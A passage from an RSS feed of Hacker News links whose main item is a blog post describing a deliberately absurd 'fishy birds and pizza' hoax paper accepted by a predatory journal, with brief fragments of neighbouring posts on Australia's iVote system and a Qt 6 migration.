<p>The laws of mathematics are very commendable, but the only law that applies in Australia is the law of Australia.</p>
</blockquote>
<p>I don’t know what it is with Australian politicians. Do they all think math just goes away if you outlaw it or pretend it doesn’t exist? If a tree falls in the forest and no cryptographers are around to hear it, is the New South Wales iVote® system still insecure?</p></div></div></div>]]>
            </description>
            <link>https://www.attejuvonen.fi/meddling-cryptographers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25811809</guid>
            <pubDate>Sun, 17 Jan 2021 16:07:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Another scam paper published in a “scientific” journal]]>
            </title>
            <description>
<![CDATA[
Score 83 | Comments 45 (<a href="https://news.ycombinator.com/item?id=25811802">thread link</a>) | @DanielBMarkham
<br/>
January 17, 2021 | https://whyevolutionistrue.com/2021/01/15/another-scam-paper-published-in-a-scientific-journal/ | <a href="https://web.archive.org/web/*/https://whyevolutionistrue.com/2021/01/15/another-scam-paper-published-in-a-scientific-journal/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-346301">
	<!-- .entry-header -->

	<div>
		<p>I’ve written before about predatory scientific journals: those fly-by-night venues that will publish nearly any submitted paper, however dreadful. Their motive is to get the thousands of dollars in “publication fees” that authors are forced to pay. In return, the authors get to cite their paper on their c.v.s, even though most papers in these journals are worthless. (Those who evaluate c.v.s, however, often don’t know which journals are bogus.)</p>
<p><a href="https://whyevolutionistrue.com/2020/04/16/hoax-a-crazy-hilarious-paper-in-a-predatory-journal/">In April of last year</a> I wrote about a hilarious and deliberately insane paper written by Daniel Baldassare, “What’s the deal with birds?”, published in the predatory <em>Scientific Journal of Research and Reviews</em> (it’s not there any longer).&nbsp; Its thesis, such as it was, was that birds tending to look like fish (i.e., penguins) occurred in areas most susceptible to climate change, while birds with weird beaks (i.e;, parrots), didn’t live in those areas. But it was a farrago of madness and humor, done on purpose to show that these journals will publish anything. Here are the “data” from Baldassare’s paper:</p>
<p><a href="https://whyevolutionistrue.com/wp-content/uploads/2021/01/screen-shot-2020-04-16-at-12.05.49-pm.png"><img data-attachment-id="346443" data-permalink="https://whyevolutionistrue.com/2021/01/15/another-scam-paper-published-in-a-scientific-journal/screen-shot-2020-04-16-at-12-05-49-pm-2/" data-orig-file="https://whyevolutionistrue.com/wp-content/uploads/2021/01/screen-shot-2020-04-16-at-12.05.49-pm.png" data-orig-size="2604,1432" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="screen-shot-2020-04-16-at-12.05.49-pm" data-image-description="" data-medium-file="https://whyevolutionistrue.com/wp-content/uploads/2021/01/screen-shot-2020-04-16-at-12.05.49-pm-300x165.png" data-large-file="https://whyevolutionistrue.com/wp-content/uploads/2021/01/screen-shot-2020-04-16-at-12.05.49-pm-500x275.png" loading="lazy" src="https://whyevolutionistrue.com/wp-content/uploads/2021/01/screen-shot-2020-04-16-at-12.05.49-pm.png" alt="" width="739" height="407" srcset="https://whyevolutionistrue.com/wp-content/uploads/2021/01/screen-shot-2020-04-16-at-12.05.49-pm.png 2604w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/screen-shot-2020-04-16-at-12.05.49-pm-300x165.png 300w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/screen-shot-2020-04-16-at-12.05.49-pm-500x275.png 500w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/screen-shot-2020-04-16-at-12.05.49-pm-768x422.png 768w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/screen-shot-2020-04-16-at-12.05.49-pm-1536x845.png 1536w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/screen-shot-2020-04-16-at-12.05.49-pm-2048x1126.png 2048w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/screen-shot-2020-04-16-at-12.05.49-pm-1200x660.png 1200w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/screen-shot-2020-04-16-at-12.05.49-pm-863x475.png 863w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/screen-shot-2020-04-16-at-12.05.49-pm-196x108.png 196w" sizes="(max-width: 739px) 100vw, 739px" data-lazy-srcset="https://whyevolutionistrue.com/wp-content/uploads/2021/01/screen-shot-2020-04-16-at-12.05.49-pm.png 2604w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/screen-shot-2020-04-16-at-12.05.49-pm-300x165.png 300w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/screen-shot-2020-04-16-at-12.05.49-pm-500x275.png 500w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/screen-shot-2020-04-16-at-12.05.49-pm-768x422.png 768w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/screen-shot-2020-04-16-at-12.05.49-pm-1536x845.png 1536w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/screen-shot-2020-04-16-at-12.05.49-pm-2048x1126.png 2048w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/screen-shot-2020-04-16-at-12.05.49-pm-1200x660.png 1200w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/screen-shot-2020-04-16-at-12.05.49-pm-863x475.png 863w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/screen-shot-2020-04-16-at-12.05.49-pm-196x108.png 196w" data-lazy-src="https://whyevolutionistrue.com/wp-content/uploads/2021/01/screen-shot-2020-04-16-at-12.05.49-pm.png?is-pending-load=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></p>
<p>I guess after Baldassare exposed both the paper and the journal <a href="https://twitter.com/evornithology/status/1245817707024592898">in his Twitter thread</a>, they decided to remove the paper. Baldassare, by the way, managed to bargain the “author’s fee” down from $1700 to zero. <em><a href="https://www.audubon.org/news/whats-deal-birds-new-paper-ask">Audubon Magazine</a></em> even wrote a piece about the hoax.</p>
<p>Now we have another of these hoax papers, also dealing with “fishy” birds. <a href="https://juniperpublishers.com/ofoaj/">This one</a>, published by Martin Stervander and Danny Haelewaters, appears in&nbsp;in <em>Oceanography &amp; Fisheries. </em>It’s&nbsp;still up (click on the screenshot), but won’t be for long (I have a pdf for you if it’s taken down).</p>
<p><a href="https://juniperpublishers.com/ofoaj/OFOAJ.MS.ID.555850.php"><img data-attachment-id="346303" data-permalink="https://whyevolutionistrue.com/2021/01/15/another-scam-paper-published-in-a-scientific-journal/screen-shot-2021-01-14-at-9-36-37-am/" data-orig-file="https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-14-at-9.36.37-AM.png" data-orig-size="1690,664" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Screen Shot 2021-01-14 at 9.36.37 AM" data-image-description="" data-medium-file="https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-14-at-9.36.37-AM-300x118.png" data-large-file="https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-14-at-9.36.37-AM-500x196.png" loading="lazy" src="https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-14-at-9.36.37-AM.png" alt="" width="669" height="263" srcset="https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-14-at-9.36.37-AM.png 1690w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-14-at-9.36.37-AM-300x118.png 300w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-14-at-9.36.37-AM-500x196.png 500w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-14-at-9.36.37-AM-768x302.png 768w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-14-at-9.36.37-AM-1536x603.png 1536w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-14-at-9.36.37-AM-1200x471.png 1200w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-14-at-9.36.37-AM-863x339.png 863w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-14-at-9.36.37-AM-275x108.png 275w" sizes="(max-width: 669px) 100vw, 669px" data-lazy-srcset="https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-14-at-9.36.37-AM.png 1690w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-14-at-9.36.37-AM-300x118.png 300w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-14-at-9.36.37-AM-500x196.png 500w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-14-at-9.36.37-AM-768x302.png 768w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-14-at-9.36.37-AM-1536x603.png 1536w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-14-at-9.36.37-AM-1200x471.png 1200w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-14-at-9.36.37-AM-863x339.png 863w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-14-at-9.36.37-AM-275x108.png 275w" data-lazy-src="https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-14-at-9.36.37-AM.png?is-pending-load=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></p>
<p>The premise and thesis is also bull-goose loony, again on purpose. This time their complex hypothesis took into account no fewer than four biological factors. Here’s how the authors describe the genesis of the hypothesis:</p>
<blockquote>
<p>At the time we developed the original idea about fishiness of birds potentially being correlated to absence of poisonous mushrooms, one of the authors (D.H.) was eating pizza with four cheeses, chicken, anchovies, and mushrooms. It was really a good one, and this prompted us to—just like the pizza—integrate all four parameters in this study: fishiness, birdiness, lack of fungal toxicity, and effects of prolonged heating. We note that integrative taxonomy approaches [8], and by extension approaches to integrate everything in research, are being increasingly employed, thus supporting the rationale for the work presented in this paper.</p>
<p>It is important to keep in mind that research has not always been this integrative, or cross-disciplinary. For example, Charles Darwin worked alone [9] and still published a relatively well-cited contribution to the field of theology and some other disciplines. We feel it is natural for humans to dangle up and down between extremes. This is true for scientists, just like it is for politicians (consider the formation of the European Union in the 1990s and early 2000s versus the current wish of some countries to leave again [10]).</p>
<p>All in all, in this study we present the results of our work with fishy birds (<i>fide Baldassarre</i>&nbsp;[1]). We hypothesize that, (1) despite climate change, it is still cold in Antarctica and thus the presumed lack of poisonous fungi leads to fishy-looking birds. Further, with a clear correlation of pizza and lower latitudes [11], we hypothesize that (2) birdy-looking birds (as well as fishy-looking fish) will be more prevalent than fishy-looking birds on pizzas.</p>
</blockquote>
<p>Any good reviewer would have spotted this in an instant as a Poe, but of course these journals don’t care about quality, or even seriousness. I doubt the reviewers even read the papers.</p>
<p>Their results, like Baldassari’s are presented in a single bizarre figure, with lots of bogus statements in the text about statistical methods and significance. But what they conclude is that birds that look like fish (i.e., penguins) tend to occur in areas without poisonous fungi (Antarctica), while birds that don’t look like fish (chickens, swifts, etc; they also threw in a flying fish that looks like a swift, an anchovy, and a “Nemo fish”) live at lower latitudes where there’s an abundance of pizza. A remarkable vindication of their thesis! The results in graphic form:</p>
<p><a href="https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-5.39.26-AM.png"><img data-attachment-id="346381" data-permalink="https://whyevolutionistrue.com/2021/01/15/another-scam-paper-published-in-a-scientific-journal/screen-shot-2021-01-15-at-5-39-26-am/" data-orig-file="https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-5.39.26-AM.png" data-orig-size="2160,1296" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Screen Shot 2021-01-15 at 5.39.26 AM" data-image-description="" data-medium-file="https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-5.39.26-AM-300x180.png" data-large-file="https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-5.39.26-AM-500x300.png" loading="lazy" src="https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-5.39.26-AM.png" alt="" width="899" height="539" srcset="https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-5.39.26-AM.png 2160w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-5.39.26-AM-300x180.png 300w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-5.39.26-AM-500x300.png 500w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-5.39.26-AM-768x461.png 768w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-5.39.26-AM-1536x922.png 1536w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-5.39.26-AM-2048x1229.png 2048w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-5.39.26-AM-1200x720.png 1200w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-5.39.26-AM-863x518.png 863w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-5.39.26-AM-180x108.png 180w" sizes="(max-width: 899px) 100vw, 899px" data-lazy-srcset="https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-5.39.26-AM.png 2160w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-5.39.26-AM-300x180.png 300w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-5.39.26-AM-500x300.png 500w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-5.39.26-AM-768x461.png 768w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-5.39.26-AM-1536x922.png 1536w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-5.39.26-AM-2048x1229.png 2048w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-5.39.26-AM-1200x720.png 1200w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-5.39.26-AM-863x518.png 863w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-5.39.26-AM-180x108.png 180w" data-lazy-src="https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-5.39.26-AM.png?is-pending-load=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></p>
<p>. . .&nbsp; and in the text:</p>
<blockquote>
<p>Our PCA revealed that most of the variation in the dataset was partitioned along the first (59.3%) and second (34.8%) principal components (PCs), with loadings corresponding to poisonous funginess and pizza toppingness, respectively (Table 1). There is a clear bimodality in both PC scores, distinguishing on the one hand penguins (PC1, low funginess) and on the other hand anchovy and chicken (PC2, high toppingness). Plotting the scores for all taxa, a quadratic model explains the two-dimensional distribution of avian species (p &lt;&lt;&lt; 0.05) with low residual variation except for the outlier&nbsp;<i>H. rustica</i>&nbsp;(Figure 1).</p>
</blockquote>
<p>They note that while fishy-looking birds occur in areas lacking poisonous fungi&nbsp;<em>and</em> pizza, that relationship doesn’t hold for birdy-looking fish (flying fish).&nbsp; They also note that the swallow is an outlier.</p>
<p>In the discussion they take up the parlous subject of climate change, and postulate that, with global warming, poisonous fungi may invade Antarctica and “may thus exert a strong selection pressure on penguins to evolve a less fishy morphology,” so that the evolved penguins may, with their new appearance, expand into “pizza topping habitats.”</p>
<p>There are two more immediate clues that this was a hoax: the acknowledgements (which damn predatory journals!) and the author contributions, which cite Darwin:</p>
<p><a href="https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-9.14.05-AM.png"><img data-attachment-id="346450" data-permalink="https://whyevolutionistrue.com/2021/01/15/another-scam-paper-published-in-a-scientific-journal/screen-shot-2021-01-15-at-9-14-05-am/" data-orig-file="https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-9.14.05-AM.png" data-orig-size="1104,808" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Screen Shot 2021-01-15 at 9.14.05 AM" data-image-description="" data-medium-file="https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-9.14.05-AM-300x220.png" data-large-file="https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-9.14.05-AM-500x366.png" loading="lazy" src="https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-9.14.05-AM.png" alt="" width="450" height="330" srcset="https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-9.14.05-AM.png 1104w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-9.14.05-AM-300x220.png 300w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-9.14.05-AM-500x366.png 500w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-9.14.05-AM-768x562.png 768w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-9.14.05-AM-863x632.png 863w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-9.14.05-AM-148x108.png 148w" sizes="(max-width: 450px) 100vw, 450px" data-lazy-srcset="https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-9.14.05-AM.png 1104w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-9.14.05-AM-300x220.png 300w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-9.14.05-AM-500x366.png 500w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-9.14.05-AM-768x562.png 768w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-9.14.05-AM-863x632.png 863w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-9.14.05-AM-148x108.png 148w" data-lazy-src="https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-9.14.05-AM.png?is-pending-load=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></p>
<p><a href="https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-9.14.14-AM.png"><img data-attachment-id="346451" data-permalink="https://whyevolutionistrue.com/2021/01/15/another-scam-paper-published-in-a-scientific-journal/screen-shot-2021-01-15-at-9-14-14-am/" data-orig-file="https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-9.14.14-AM.png" data-orig-size="1140,226" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Screen Shot 2021-01-15 at 9.14.14 AM" data-image-description="" data-medium-file="https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-9.14.14-AM-300x59.png" data-large-file="https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-9.14.14-AM-500x99.png" loading="lazy" src="https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-9.14.14-AM.png" alt="" width="590" height="117" srcset="https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-9.14.14-AM.png 1140w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-9.14.14-AM-300x59.png 300w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-9.14.14-AM-500x99.png 500w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-9.14.14-AM-768x152.png 768w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-9.14.14-AM-863x171.png 863w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-9.14.14-AM-480x95.png 480w" sizes="(max-width: 590px) 100vw, 590px" data-lazy-srcset="https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-9.14.14-AM.png 1140w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-9.14.14-AM-300x59.png 300w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-9.14.14-AM-500x99.png 500w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-9.14.14-AM-768x152.png 768w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-9.14.14-AM-863x171.png 863w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-9.14.14-AM-480x95.png 480w" data-lazy-src="https://whyevolutionistrue.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-15-at-9.14.14-AM.png?is-pending-load=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></p>
<p>First author Martin Stervander also wrote <a href="https://www.stervander.com/fishy-birds-birdy-fish-poisonous-fungi-and-pizza-our-scientific-breakthroughs-published-in-predatory-journal/">an exposé on his own website</a> about the paper, including a positive “review” of the paper for another journal where it was submitted, <em>Journal of Ecosystems and Ecography</em>, published by OMICS International. It’s clear that the reviewing process of all these journals is deficient—to say the least. But if it was rigorous, they’d have no way to make money!</p>
<p><a href="https://whyevolutionistrue.com/wp-content/uploads/2021/01/PeerReviewComments-300x115-1.png"><img data-attachment-id="346462" data-permalink="https://whyevolutionistrue.com/2021/01/15/another-scam-paper-published-in-a-scientific-journal/peerreviewcomments-300x115/" data-orig-file="https://whyevolutionistrue.com/wp-content/uploads/2021/01/PeerReviewComments-300x115-1.png" data-orig-size="300,115" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="PeerReviewComments-300×115" data-image-description="" data-medium-file="https://whyevolutionistrue.com/wp-content/uploads/2021/01/PeerReviewComments-300x115-1.png" data-large-file="https://whyevolutionistrue.com/wp-content/uploads/2021/01/PeerReviewComments-300x115-1.png" loading="lazy" src="https://whyevolutionistrue.com/wp-content/uploads/2021/01/PeerReviewComments-300x115-1.png" alt="" width="412" height="158" srcset="https://whyevolutionistrue.com/wp-content/uploads/2021/01/PeerReviewComments-300x115-1.png 300w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/PeerReviewComments-300x115-1-282x108.png 282w" sizes="(max-width: 412px) 100vw, 412px" data-lazy-srcset="https://whyevolutionistrue.com/wp-content/uploads/2021/01/PeerReviewComments-300x115-1.png 300w, https://whyevolutionistrue.com/wp-content/uploads/2021/01/PeerReviewComments-300x115-1-282x108.png 282w" data-lazy-src="https://whyevolutionistrue.com/wp-content/uploads/2021/01/PeerReviewComments-300x115-1.png?is-pending-load=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></p>
<p>So we have another exposé of&nbsp; predatory journals, which we all know exist because every scientist gets daily requests for submissions to these journals, even when the journals aren’t remotely connected with the scientist’s research. (I’ve had pleas for my papers from journals in obstetrics and gynecology.) But there’s no better way to expose this nonsense than to publish a loony paper in it.&nbsp; Sadly, this doesn’t bring down the journals (they just remove the papers), and they continue to serve as citations for desperate scientists.</p>
<p>Is there anything unethical about these hoaxes? Hell, no: there’s no way anybody could be deceived by papers like these, and it’s the best way to show the journals up for what they are.</p>
<p>They also resemble the “hoax papers” sent by Boghossian, Pluckrose, and Lindsay to social-science journals in the famous “grievance studies affair” that now has<a href="https://en.wikipedia.org/wiki/Grievance_studies_affair"> its own <em>Wikipedia</em> page</a>. As I wrote last April:</p>
<blockquote><p>One final remark. In the “<a href="https://en.wikipedia.org/wiki/Grievance_studies_affair">grievance studies affair</a>“, Helen Pluckrose, James Lindsay, and especially Peter Boghossian got into big trouble for “hoaxing” humanities journals with equally ludicrous papers.&nbsp; Baldassarre won’t get into trouble (and shouldn’t), for his paper is in a clearly predatory journal.&nbsp; But what’s the difference between a predatory scientific journal that will publish nonsense and humanities journals like&nbsp;<em>Fat Studies</em>&nbsp;or&nbsp;<em>Gender, Place &amp; Culture</em>&nbsp;that publish nonsense but also purport to be venues for serious research? In effect, they both do the same thing: help researchers fatten their c.v.s with worthless research. Why should Boghossian et al. be excoriated for exposing the same kind of crappy journal standards that Baldassarre did?</p>
<p><em>Anything</em>&nbsp;that exposes this kind of academic garbage, including clear hoax papers, is to be applauded, so long as the hoaxes are revealed (as they were with the Grievance Studies Trio) or are so palpably ridiculous (as with Baldassarre’s paper) that they couldn’t be anything&nbsp;<em>other</em>&nbsp;than a hoax.</p></blockquote>
<p>Amen.</p>
<p>h/t: Martim Melo</p>

			</div><!-- .entry-content -->

	<!-- .entry-footer -->
</article></div>]]>
            </description>
            <link>https://whyevolutionistrue.com/2021/01/15/another-scam-paper-published-in-a-scientific-journal/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25811802</guid>
            <pubDate>Sun, 17 Jan 2021 16:06:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Migrating a Harvester HMI from Qt 5.12 to Qt 6.0]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25811697">thread link</a>) | @todsacerdoti
<br/>
January 17, 2021 | https://embeddeduse.com/2021/01/17/migrating-a-harvester-hmi-from-qt-5-12-to-qt-6-0/ | <a href="https://web.archive.org/web/*/https://embeddeduse.com/2021/01/17/migrating-a-harvester-hmi-from-qt-5-12-to-qt-6-0/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>December 2020 saw the launch of Qt 6 – the first new major version since 2012. I wanted to find out how fit Qt 6.0 is for Qt embedded systems. I took the driver terminal of the <a href="https://embeddeduse.com/2019/11/06/qt-controller-area-networks-talk-qtws19/">ROPA sugar beet harvesters</a> and migrated it from Qt 5.12 to Qt 6.0 as a side project. The migration was smooth, but incomplete. The driver terminal uses the Qt modules Multimedia and SerialBus, which haven’t been ported to Qt 6 yet. An update of the driver terminal would have to wait at least until the end of 2021, when Qt 6.2 will finally be feature-complete.</p>



<h2>Introduction</h2>



